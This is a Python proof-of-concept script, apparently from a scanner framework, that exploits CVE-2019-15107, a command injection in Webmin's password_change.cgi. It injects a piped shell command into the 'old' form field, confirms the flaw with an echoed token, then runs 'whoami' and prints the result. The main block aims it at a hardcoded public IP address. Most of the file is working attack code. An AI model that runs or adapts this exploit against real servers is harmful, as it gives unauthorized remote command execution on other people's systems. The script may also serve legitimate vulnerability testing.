#!/usr/bin/env python3

'''
name: CVE-2019-15107 任意代码执行漏洞
description: CVE-2019-15107 任意代码执行漏洞
'''

import re
import sys
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class CVE_2019_15107_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta()
        self.headers = {
            'Accept-Encoding': "gzip, deflate",
            'Accept': "*/*",
            'Accept-Language': "en",
            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            'Connection': "close",
            'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
            'Referer': "%s/session_login.cgi" %self.url,
            'Content-Type': "application/x-www-form-urlencoded",
            'Content-Length': "60",
            'cache-control': "no-cache"
        }
        self.check_payload = "user=rootxx&pam=&expired=2&old=test|%s&new1=test2&new2=test2" % ('echo' + ' ' + self.capta)
        self.cmd_payload = "user=The current password isrootxx&pam=&expired=2&old=test|%s&new1=test2&new2=test2" % ('whoami')

    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            vuln_url = self.url + "/password_change.cgi"
            check_req = request.post(url = vuln_url, headers = self.headers, data = self.check_payload)
            if check_req.status_code ==200 and " " in check_req.text and self.capta in check_req.text:
                cmd_req = request.post(url = vuln_url, headers = self.headers, data = self.cmd_payload)
                pattern = re.compile(r"<center><h3>Failed to change password : The current password is incorrect(.*)</h3></center>", re.DOTALL)
                cmd_result = pattern.findall(cmd_req.text)[0]
                print("存在CVE-2019-15107 任意代码执行漏洞,执行whoami命令结果是:", cmd_result)
                return True
            else:
                print("不存在CVE-2019-15107 任意代码执行漏洞")
                return False
        except Exception as e:
            print(e)
            return False
            pass

if __name__ == "__main__":
    CVE_2019_15107 = CVE_2019_15107_BaseVerify("http://182.61.162.205:10000/")
    CVE_2019_15107.run()